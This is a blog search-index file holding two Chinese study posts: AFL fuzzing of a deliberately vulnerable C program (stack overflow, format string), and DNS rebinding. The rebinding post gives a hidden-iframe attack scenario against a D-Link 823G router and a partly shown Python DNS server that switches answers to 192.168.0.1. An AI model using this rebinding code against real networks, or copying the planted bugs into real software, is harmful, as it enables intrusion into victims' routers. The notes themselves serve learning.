<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AFL Fuzzing study notes</title>
    <url>/post/35374.html</url>
    <content><![CDATA[<h2 id="AFL-Fuzzing-study-notes"><a href="#AFL-Fuzzing-study-notes" class="headerlink" title="AFL Fuzzing study notes"></a>AFL Fuzzing study notes</h2><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>本文采用的测试环境是<code>ubuntu 16.04</code></p>
<p><code>AFL</code>下载地址: <a href="http://lcamtuf.coredump.cx/afl/" target="_blank" rel="noopener">http://lcamtuf.coredump.cx/afl/</a> </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf afl-latest.tgz	# 解压代码</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 编译安装</span></span><br><span class="line">cd afl-2.52b</span><br><span class="line">make </span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<p>不出意外可以直接编译成功,之后在终端输入<code>afl-</code>,按两下<code>tab</code>,会出现一些命令</p>
<p><img src="http://file.smilehacker.net/1570950620531.png" alt="1570950620531"></p>
<a id="more"></a>


<h2 id="有源码AFL测试-源码插桩"><a href="#有源码AFL测试-源码插桩" class="headerlink" title="有源码AFL测试-源码插桩"></a>有源码AFL测试-源码插桩</h2><p>测试代码如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">'A'</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">'F'</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"it is good!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);<span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    vuln(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>afl-fuzz</code>基本流程</p>
<ul>
<li>使用<code>afl-gcc</code>对代码进行插桩编译</li>
<li>生成<code>testcase</code>(输入文件)，最好小于<code>1k</code>，如果大于<code>1k</code>影响效率</li>
<li>启动<code>afl-fuzz</code>程序，将<code>testcase</code>作为程序的输入执行程序</li>
<li><code>afl</code>会在<code>testcase</code>的基础上自动变异输入，让程序<code>crash</code>，并记录<code>crash</code>信息</li>
</ul>
<h3 id="插桩编译"><a href="#插桩编译" class="headerlink" title="插桩编译"></a>插桩编译</h3><p>将上面的程序用<code>afl-gcc</code>编译</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-gcc -g -o afl_test afl_test.c</span><br></pre></td></tr></table></figure>

<p>如果是编译C++源码，就要将<code>afl-gcc</code>替换成<code>afl-g++</code></p>
<p>接着建立两个文件<code>afl_in</code>，<code>afl_out</code>用来存放程序的输入和<code>Fuzz</code>输出的结果。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir afl_in afl_out</span><br></pre></td></tr></table></figure>

<p>到此，还需要一个<code>testcase</code>文件，将<code>testcase</code>文件中的内容喂给程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo "aaa" &gt; afl_in/testcase  # testcase中的内容可以为任意内容</span><br></pre></td></tr></table></figure>

<p><strong>备注:</strong></p>
<p>目标程序中有<code>makefile</code>文件，分两种情况</p>
<ol>
<li><p>程序用<code>autoconf</code>构建</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure CC="afl-gcc" CXX="afl-g++"</span><br></pre></td></tr></table></figure>

<p> 此外，还可以执行如下语句设置<code>LD_LIBRARY_PATH</code>让程序加载经过<code>AFL</code>插桩的<code>.so</code>文件，进行静态构建而不是动态链接 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure --disable-shared CC="afl-gcc" CXX="afl-g++"</span><br></pre></td></tr></table></figure>
</li>
<li><p>程序不是<code>autoconf</code>构建， 那么直接修改Makefile文件中的编译器为<code>afl-gcc/g++</code>。</p>
<p> 为了后期更好的分析crash，在此处可以开启<code>Address Sanitizer(ASAN)</code>这个内存检测工具，此工具可以更好的检测出缓存区溢出、<code>UAF</code>等内存漏洞，开启方法如下: </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">AFL_USE_ASAN=1 ./configure CC=afl-gcc CXX=afl-g++ LD=afl-gcc--disable-shared</span><br><span class="line">AFL_USE_ASAN=1 make</span><br></pre></td></tr></table></figure>



</li>
</ol>
<pre><code>不使用 `AFL`编译插桩时，可使用以下方式开启 `Address Sanitizer`</code></pre>   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./configure CC=gcc CXX=g++ CFLAGS=&quot;-g -fsanitize=address&quot;</span><br></pre></td></tr></table></figure>



<h3 id="开始Fuzz"><a href="#开始Fuzz" class="headerlink" title="开始Fuzz"></a>开始Fuzz</h3><p><code>Fuzz</code>的语法一般有两种</p>
<ol>
<li><p>直接从<code>stdin</code>读取输入的目标程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i testcase_dir -o findings_dir /path/to/program […params…]</span><br></pre></td></tr></table></figure>
</li>
<li><p>从文件读取输入的目标程序，@@就是占位符，表示输入替换的位置 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>常见命令的含义:</p>
<ul>
<li>-f参数表示：<code>testcase</code>的内容会作为<code>afl_test</code>的<code>stdin</code></li>
<li>-m参数表示分配的内存空间</li>
<li>-i 指定测试样本的路径</li>
<li>-o 指定输出结果的路径</li>
<li>/dev/null 使错误信息不输出到屏幕</li>
<li>-t：设置程序运行超时值，单位为 ms</li>
<li>-M：运行主(Master) <code>Fuzzer</code></li>
<li>-S：运行从属(Slave) <code>Fuzzer</code></li>
</ul>
<p>运行<code>afl-fuzz</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i afl_in/ -o afl_out/ ./afl_test -f</span><br></pre></td></tr></table></figure>

<p>此处如果第一次运行会报一个错误</p>
<p><img src="http://file.smilehacker.net/1571209319832.png" alt="1571209319832"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Pipe at the beginning of 'core_pattern'</span><br></pre></td></tr></table></figure>

<p>解决方法如下:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo core &gt;/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>

<h3 id="Fuzz运行界面"><a href="#Fuzz运行界面" class="headerlink" title="Fuzz运行界面"></a>Fuzz运行界面</h3><p><img src="http://file.smilehacker.net/1570957117241.png" alt="1570957117241"></p>
<p>下面选择界面上几个重要的部分来介绍一下</p>
<ul>
<li><p>process timing :</p>
<ul>
<li>run time : 当前Fuzz的运行时间</li>
<li>last new path : 最后一次发现新路径的时间</li>
<li>last uniq crash : 最后一次崩溃的时间</li>
<li>last uniq hang : 最后一次超时的时间</li>
</ul>
<p>值得注意的是第二项<code>last new path</code>, 最近一次发现新路径的时间。如果由于目标二进制文件或者命令行参数出错，那么其执行路径应该是一直不变的，所以如果从fuzzing开始一直没有发现新的执行路径，那么就要考虑是否有二进制或者命令行参数错误的问题了。对于此状况，<code>AFL</code>也会智能地进行提醒 。</p>
</li>
<li><p>overall results:</p>
<ul>
<li><p>cycles done : 运行的总周期处</p>
</li>
<li><p>total path : 当前发现的总路径数</p>
</li>
<li><p>uniq crashes : 当前崩溃测试</p>
</li>
<li><p>uniq hangs : 当前程序响应超时次数</p>
<p><code>total path</code>可以用来作为何时停止fuzzing的参考。随着不断地fuzzing，周期数会不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。一般来说，当其变为绿色时，代表可执行的内容已经很少了，继续fuzzing下去也不会有什么新的发现了。此时，我们便可以通过<code>Ctrl-C</code>，中止当前的fuzzing </p>
</li>
</ul>
</li>
<li><p>stage progress</p>
<ul>
<li><p>now trying : 正在测试的<code>Fuzz</code>策略</p>
</li>
<li><p>stage execs: 当前测试的进度</p>
</li>
<li><p>total execs:目标的执行总次数</p>
</li>
<li><p>exec speed : 目标的实行速度</p>
<p><code>exec speed</code>可以直观地反映当前跑的快不快，如果速度过慢，比如低于500次每秒，那么测试时间就会变得非常漫长。如果发生了这种情况，那么我们需要进一步调整优化我们的fuzzing </p>
</li>
</ul>
</li>
</ul>
<p>以上是运行界面常用的关注点, 想要查看具体的介绍请查看<a href="http://lcamtuf.coredump.cx/afl/status_screen.txt" target="_blank" rel="noopener">官方文档</a></p>
<h3 id="Crash分析"><a href="#Crash分析" class="headerlink" title="Crash分析"></a>Crash分析</h3><p>通过上图，稍微跑了不到一分钟，发现了5个<code>crash</code></p>
<p>查看<code>afl_out</code>生成的文件:</p>
<p><img src="http://file.smilehacker.net/1570955956378.png" alt="1570955956378"></p>
<ul>
<li><code>crashes</code> : 存放使程序产生<code>crash</code>的样例</li>
<li><code>hangs</code> : 使程序产生超时的样例</li>
<li><code>queue</code>: 存放每个不同执行路径的用例</li>
</ul>
<p>我们来看看<code>crashes</code> 目录下的几个样例</p>
<p><img src="http://file.smilehacker.net/1570957526718.png" alt="1570957526718"></p>
<p>想要具体分析，我们只需要把得到的<code>crash</code>文件作为参数输入到程序中，使用gdb调试分析就可以得到详细的结果。在分析之前先用<code>xxd</code>命令查看下文件内容，对产生的异常做一个初步判断。</p>
<ul>
<li><p>可能为缓冲区溢出：</p>
<p><img src="http://file.smilehacker.net/1570957848925.png" alt="1570957848925"></p>
</li>
<li><p>可能为预期内的异常,<code>F</code>开头且长度为6</p>
<p><img src="http://file.smilehacker.net/1570957969884.png" alt="1570957969884"></p>
</li>
<li><p>缓冲区溢出？</p>
<p><img src="http://file.smilehacker.net/1570958012787.png" alt="1570958012787"></p>
</li>
<li><p>根据源代码基本可以确定为格式化字符串漏洞</p>
<p><img src="http://file.smilehacker.net/1570958072893.png" alt="1570958072893"></p>
</li>
<li><p>可能使预料中的异常</p>
<p><img src="http://file.smilehacker.net/1570958118182.png" alt="1570958118182"></p>
</li>
</ul>
<p>在文末补充具体的异常调试</p>
<h2 id="有源码AFL测试-LLVM模式"><a href="#有源码AFL测试-LLVM模式" class="headerlink" title="有源码AFL测试-LLVM模式"></a>有源码AFL测试-LLVM模式</h2><p><code>LLVM Mode</code>模式编译程序可以获得更快的Fuzzing速度，因此针对大型项目可以考虑启用</p>
<h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>安装系统依赖包:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install llvm clang</span><br></pre></td></tr></table></figure>

<p>进入<code>AFL</code>源码目录编译<code>afl llvm</code>模块</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd llvm_mode/</span><br><span class="line"></span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p>编译完成后,在<code>AFL</code>跟目录下应该出现了<code>afl-clang-fast</code>,后面编译代码时使用<code>afl-clang-fast</code>构建程序即可。需要添加一下软连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo ln -s /home/tt/afl-2.52b/afl-clang-fast[源路径] /usr/local/bin/afl-clang-fast[目标路径]</span><br></pre></td></tr></table></figure>

<h3 id="llvm-model编译代码"><a href="#llvm-model编译代码" class="headerlink" title="llvm model编译代码"></a><code>llvm model</code>编译代码</h3><p>使用<code>afl-clang-fast</code>编译最初存在漏洞的代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-clang-fast -g afl_test.c -o afl_test</span><br></pre></td></tr></table></figure>

<p><img src="http://file.smilehacker.net/1571023550045.png" alt="1571023550045"></p>
<h3 id="开始Fuzz-1"><a href="#开始Fuzz-1" class="headerlink" title="开始Fuzz"></a>开始Fuzz</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i afl_in -o afl_out ./afl_test -f</span><br></pre></td></tr></table></figure>

<p><img src="http://file.smilehacker.net/1571023823108.png" alt="1571023823108"></p>
<h2 id="无源码的AFL测试-Qemu模式"><a href="#无源码的AFL测试-Qemu模式" class="headerlink" title="无源码的AFL测试-Qemu模式"></a>无源码的AFL测试-Qemu模式</h2><h3 id="安装Qemu"><a href="#安装Qemu" class="headerlink" title="安装Qemu"></a>安装<code>Qemu</code></h3><p>还有一些情况我们根本拿不到程序的代码，没有办法对源码进行插桩，不过<code>AFL</code>提供了<code>qemu</code>模式进行测试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd afl-2.52b/qemu-mode</span><br><span class="line"></span><br><span class="line">./build_qemu_support.sh </span><br><span class="line">cd ..</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>有可能在执行<code>./build_qemu_support.sh</code>时出现如下错误</p>
<p><img src="http://file.smilehacker.net/1570980361643.png" alt="1570980361643"></p>
<p>执行如下代码即可:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://mirrors.kernel.org/gnu/libtool/libtool-2.2.6b.tar.gz \</span><br><span class="line">&amp;&amp; tar xzvf libtool-2.2.6b.tar.gz \</span><br><span class="line">&amp;&amp; cd libtool-2.2.6b \</span><br><span class="line">&amp;&amp; ./configure –prefix=/usr/local</span><br><span class="line"></span><br><span class="line">make &amp;&amp; sudo make install</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##############或者#############</span></span></span><br><span class="line">sudo apt-get install libtool-bin</span><br></pre></td></tr></table></figure>

<p>编译成功:</p>
<p><img src="http://file.smilehacker.net/1570981177555.png" alt="1570981177555"></p>
<p>回到代码目录,使用<code>gcc</code>重新编译测试代码，并重新执行<code>afl-fuzz</code>命令(这次加上<code>-Q</code>)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc afl_test.c -o afl_test</span><br><span class="line"></span><br><span class="line">afl-fuzz -i afl_in/ -o afl_out/ -Q ./afl_test -f</span><br></pre></td></tr></table></figure>

<p>有可能碰到如下错误:</p>
<p><img src="http://file.smilehacker.net/1570982707245.png" alt="1570982707245"></p>
<p>解决方法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim ~/.bashrc</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在文件结尾添加如下内容</span></span><br><span class="line">export AFL_PATH=/home/tt/afl-2.52b #你的afl-qemu-trace所在路径，如果根据文章走下来,那就是你的afl源码目录</span><br><span class="line"></span><br><span class="line">source ~/.bashrc # 重新加载</span><br></pre></td></tr></table></figure>

<p><img src="http://file.smilehacker.net/1570982887916.png" alt="1570982887916"></p>
<p>重新运行,已经成功运行了,但是对比一下两个模式，会发现在<code>Qemu</code>模式下的速度比源码编译插桩的速度慢了很多。</p>
<h2 id="AFL-Fuzz结果分析"><a href="#AFL-Fuzz结果分析" class="headerlink" title="AFL Fuzz结果分析"></a>AFL Fuzz结果分析</h2><h3 id="工作状态"><a href="#工作状态" class="headerlink" title="工作状态"></a>工作状态</h3><p> <code>afl-fuzz</code>永远不会停止，所以何时停止测试很多时候就是依靠<code>afl-fuzz</code>提供的状态来决定的。具体的几种方式如下所示: </p>
<ul>
<li>状态窗口的<code>cycles done</code>变为绿色;</li>
<li><code>afl-whatsup</code>查看afl-fuzz状态;</li>
<li><code>afl-stat</code>得到类似于afl-whatsup的输出结果;</li>
<li>定制<code>afl-whatsup</code>-&gt;在所有代码外面加个循环就好;</li>
<li>用<code>afl-plot</code>绘制各种状态指标的直观变化趋势;</li>
<li><code>pythia</code>估算发现新crash和path概率。</li>
</ul>
<h3 id="Fuzzing结果"><a href="#Fuzzing结果" class="headerlink" title="Fuzzing结果"></a>Fuzzing结果</h3><ul>
<li>状态窗口中”cycles done”字段颜色变为绿色该字段的颜色可以作为何时停止测试的参考;</li>
<li>距上一次发现新路径（或者崩溃）已经过去很长时间了，至于具体多少时间还是需要自己把握;</li>
<li>目标程序的代码几乎被测试用例完全覆盖，这种情况好像很少见;</li>
<li>pythia提供的各种数据中，path covera达到99或者correctness的值达到1e-08(含义: 从上次发现path/uniq crash到下一次发现之间大约需要1亿次执行)</li>
</ul>
<h3 id="输出结果"><a href="#输出结果" class="headerlink" title="输出结果"></a>输出结果</h3><p>在文章中有提到过。</p>
<ul>
<li>queue：存放所有具有独特执行路径的测试用例。</li>
<li>crashes：导致目标接收致命signal而崩溃的独特测试用例。</li>
<li>crashes/README.txt：保存了目标执行这些crash文件的命令行参数。</li>
<li>hangs：导致目标超时的独特测试用例。</li>
<li>fuzzer_stats：afl-fuzz的运行状态。</li>
<li>plot_data：用于afl-plot绘图。</li>
</ul>
<h3 id="对Crash的结果进行简单分析"><a href="#对Crash的结果进行简单分析" class="headerlink" title="对Crash的结果进行简单分析"></a>对Crash的结果进行简单分析</h3><h4 id="crash-exploration-mode"><a href="#crash-exploration-mode" class="headerlink" title="crash exploration mode"></a>crash exploration mode</h4><p> afl-fuzz的一种运行模式，也称为<code>peruvian rabbit mode</code>，用于确定bug的可利用性，其输入的是crash的信息，之后使用<code>-C</code>启用这种模式，afl会自动探索并创造与之相关的crash来帮助你进行分析，比如判断能够控制某块内存地址的长度。 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-fuzz -m none -C -i ./afl_out/crashes -o ./peruvian-were-rabbit_out -- ./afl_test -f</span><br></pre></td></tr></table></figure>

<h4 id="triage-crashes-sh"><a href="#triage-crashes-sh" class="headerlink" title="triage_crashes.sh"></a>triage_crashes.sh</h4><p> AFL源码的experimental目录中有一个名为triage_crashes.sh的脚本，可以帮助我们触发收集到的crashes。 </p>
<p>直接使用脚本跟参数的话，我们可以看到相关crash情况的寄存器等信息，但是如果只是大致分类的话，可以使用如下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh /home/tt/afl-2.52b/experimental/crash_triage/triage_crashes.sh ./afl_out ./afl_test  2&gt;&amp;1 | grep SIGNAL</span><br></pre></td></tr></table></figure>

<p><img src="http://file.smilehacker.net/1571025845455.png" alt="1571025845455"></p>
<p>根据输出的11可以做一个大概的判断，但是具体还是需要手动调试</p>
<h4 id="推荐两个分析结果的工具"><a href="#推荐两个分析结果的工具" class="headerlink" title="推荐两个分析结果的工具"></a>推荐两个分析结果的工具</h4><ul>
<li>(afl-content)[ <a href="https://github.com/rc0r/afl-utils" target="_blank" rel="noopener">https://github.com/rc0r/afl-utils</a> ] afl-collect基于exploitable来检查crashes的可利用性。它可以自动删除无效的crash样本、删除重复样本以及自动化样本分类。 </li>
<li>(crashwalk)[ <a href="https://github.com/bnagy/crashwalk" target="_blank" rel="noopener">https://github.com/bnagy/crashwalk</a> ] 可以显示更详细的信息</li>
</ul>
<h3 id="代码覆盖率-afl-cov"><a href="#代码覆盖率-afl-cov" class="headerlink" title="代码覆盖率:  afl-cov"></a>代码覆盖率:  <code>afl-cov</code></h3><p>后面补充，现在有一点问题</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>对上面文章做一些补充</p>
<h3 id="缓冲区溢出分析"><a href="#缓冲区溢出分析" class="headerlink" title="缓冲区溢出分析"></a>缓冲区溢出分析</h3><p>使用<code>GDB</code>对缓冲区进行实际分析，在分析前先来看下猜测为导致缓冲区溢的<code>case</code>:</p>
<p><img src="http://file.smilehacker.net/1571209606024.png" alt="1571209606024"></p>
<p>接下来使用<code>GDB</code>加载程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb afl_test</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">直接让程序运行，并且在运行时导入AFL输出导致程序crash的<span class="keyword">case</span></span></span><br><span class="line"></span><br><span class="line">run &lt; stackoverflow</span><br></pre></td></tr></table></figure>

<p>这里对文件进行了重命名，不然在<code>gdb</code>中导入会有一点问题。</p>
<p><img src="http://file.smilehacker.net/1571209574876.png" alt="1571209574876"></p>
<p>程序运行后,找到产生<code>crash</code>位置,</p>
<p><img src="http://file.smilehacker.net/1571209819953.png" alt="1571209819953"></p>
<p> 通过栈回溯信息可以看到，程序发生了栈溢出[启用了 canary ,导致栈检查失败，随后奔溃]： </p>
<p><img src="http://file.smilehacker.net/1571209729037.png" alt="1571209729037"></p>
]]></content>
      <categories>
        <category>Fuzz</category>
      </categories>
      <tags>
        <tag>Fuzz</tag>
        <tag>study</tag>
      </tags>
  </entry>
  <entry>
    <title>DNSRebind测试笔记</title>
    <url>/post/15454.html</url>
    <content><![CDATA[<h4 id="DNS-Rebind原理"><a href="#DNS-Rebind原理" class="headerlink" title="DNS_Rebind原理"></a>DNS_Rebind原理</h4><p>为了保证<code>DNS</code>服务的可靠性，<code>DNS</code>响应记录<code>A</code>中包含一个<code>TTL（time to live）</code>值，表示当前解析结果的有效时间，客户端（浏览器）会在超过这个时间值后重新请求解析域名（取决于客户端是否遵循这个TTL值），得到的新响应中又会存在一个过期时间，客户端会再次去解析域名，如此保证获取到最新的域名解析结果。</p>
<p>若DNS服务前后响应返回的<code>ip</code>地址不一样，浏览器并不会认为跨域。如果域名后续解析到的<code>ip</code>为<code>127.0.0.1</code>、<code>192.168.0.1</code>等不同于先前解析结果，浏览器依然认为符合同源策略，会将请求发送到<code>127.0.0.1</code>机器上。如此就产生了dns rebinding攻击，从而达到绕过同源策略的目的.</p>
<p>浏览器和操作系统均会存在DNS缓存，缓存时间一般不按照DNS服务器响应中的TTL值。详细见<a href="https://dyn.com/blog/web-browser-dns-caching-bad-thing/" target="_blank" rel="noopener">WEB浏览器缓存问题</a></p>
<ul>
<li>chrome为60s左右</li>
<li>firefox 默认为60s ,可修改</li>
<li>IE为30min</li>
</ul>
<a id="more"></a>

<h4 id="DNS-Rebind攻击场景"><a href="#DNS-Rebind攻击场景" class="headerlink" title="DNS_Rebind攻击场景"></a>DNS_Rebind攻击场景</h4><ol>
<li>受害者访问攻击者的网站<code>www.smilehacker.net</code>,此时的<code>DNS</code>服务正常解析到有一个外网网站</li>
<li>但是网站中有一个隐藏的<code>&lt;iframe&gt;</code>标签,存在使用<code>AJAX</code>发送请求到<code>http://www.smilehacker.net/HNAP1/</code>,在<code>POST</code>数据包中存在对<code>D-Link 823G</code>的漏洞利用代码，</li>
<li>发送<code>&lt;iframe&gt;</code>标签中的<code>AJAX</code>请求,此时<code>DNS</code>的解析已经改变，受害者发送<code>POC</code>到<code>D-Link</code>路由器</li>
</ol>
<h4 id="TTL"><a href="#TTL" class="headerlink" title="TTL"></a>TTL</h4><p>看起来一切都很顺利，而且容易，但是这都是建立在<code>TTL=0</code>的情况下。</p>
<p>什么是TTL?</p>
<p><code>TTL(Time to Live)</code>是<code>DNS</code>的缓存时间。当<code>TTL=10</code>的时候，我们在10s内，对该域名进行多次<code>DNS</code>请求，<code>DNS</code>服务器只会收到一次请求，其他都是缓存</p>
<p>所以我们在搭建<code>DNS</code>服务器的时候，需要设置<code>TTL=0</code>,如果<code>TTL</code>不为0，第二次请求的是第一次缓存的外网IP，也就不能绕过。</p>
<p><code>JAVA</code>程序中默认的TTL=10,这个配置会导致<code>DNS Rebind</code>绕过失败，<code>JAVA</code>程序默认不受<code>DNS Rebind</code>的影响</p>
<h4 id="DNS请求过程"><a href="#DNS请求过程" class="headerlink" title="DNS请求过程"></a>DNS请求过程</h4><ol>
<li>查询本地DNS服务器(/etc/resolv.conf) [自己设置的8.8.8.8 114.114.114.114这种的]</li>
<li>如果有缓存则直接返回缓存的结果,不继续往下执行</li>
<li>如果没有缓存,则请求远程DNS服务器，然后返回</li>
</ol>
<h4 id="DNS缓存机制-巨坑！！"><a href="#DNS缓存机制-巨坑！！" class="headerlink" title="DNS缓存机制 [巨坑！！]"></a>DNS缓存机制 [巨坑！！]</h4><p><code>MAC</code>跟<code>Windows</code>上,为了加快<code>HTTP</code>访问速度，系统都会进行<code>DNS</code>缓存。但是在<code>Linux</code>上默认不会进行缓存,除非运行了<code>nscd</code>软件。</p>
<p>但是有些公共的DNS,比如百度的<code>114.114.114.114</code>,即使我们设置了<code>TTL=0</code>,依然会有两分钟的缓存，完全不按照标准协议来。遇到这种情况是无解的。</p>
<ul>
<li>8.8.8.8 本地不会进行<code>DNS</code>缓存。</li>
<li>114.114.114.114 会有两分钟的缓存</li>
</ul>
<p>除了公共DNS缓存的问题,浏览器也会有DNS缓存<a href="https://dyn.com/blog/web-browser-dns-caching-bad-thing/" target="_blank" rel="noopener">WEB浏览器缓存问题</a></p>
<ul>
<li>chrome 一分钟缓存</li>
<li>firefox 默认一分钟缓存(可修改)</li>
<li>IE 30分钟的缓存</li>
<li>QQ浏览器 40分钟左右缓存</li>
<li>Opear 不关掉窗口,缓存一直存在</li>
</ul>
<h4 id="DNS查询过程"><a href="#DNS查询过程" class="headerlink" title="DNS查询过程"></a>DNS查询过程</h4><ol>
<li><p>查看浏览器内部缓存</p>
</li>
<li><p>系统缓存</p>
</li>
<li><p>路由器缓存、ISP 缓存</p>
</li>
<li><p>本地 DNS 服务器</p>
<p>例如:8.8.8.8 114.114.114.114</p>
</li>
<li><p>域名服务器</p>
</li>
</ol>
<p>如果域名正常，应该就会返回 IP 地址，如果没有浏览器就会提示找不到服务器地址。</p>
<h4 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h4><p>使用DNS Rebind利用<a href="https://github.com/leonW7/D-Link/blob/master/Vul_2.md" target="_blank" rel="noopener"><code>CVE-2019-7298</code></a>漏洞攻击<code>D-Link 823G</code>路由器</p>
<p>首先，需要有一个域名,在域名下解析两条记录</p>
<p><img src="http://file.smilehacker.net/1111111111111111111111.png" alt="域名解析"></p>
<p>当访问<code>dns_rebind.smilehacker.net</code>的时候，去找负责解析他的<code>ns.smilehacker.net</code>，也就是<code>43.228.76.56</code>这台机器。</p>
<p>DNS Server的代码如下:<br>使用前安装<code>twisted</code></p>
<blockquote>
<p>pip install twisted -i <a href="https://pypi.douban.com/simple" target="_blank" rel="noopener">https://pypi.douban.com/simple</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line">record=&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        name = query.name.name</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            ip = <span class="string">"43.228.76.56"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip = <span class="string">"192.168.0.1"</span></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name] = <span class="number">0</span></span><br><span class="line">        record[name] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> name + <span class="string">" ===&gt; "</span> + ip</span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name = name,</span><br><span class="line">            type = dns.A,</span><br><span class="line">            cls = dns.IN,</span><br><span class="line">            ttl = <span class="number">0</span>,</span><br><span class="line">            payload = dns.Record_A(address = <span class="string">b'%s'</span> % ip, ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line">    <span class="function"><span class="keyword">def</span> 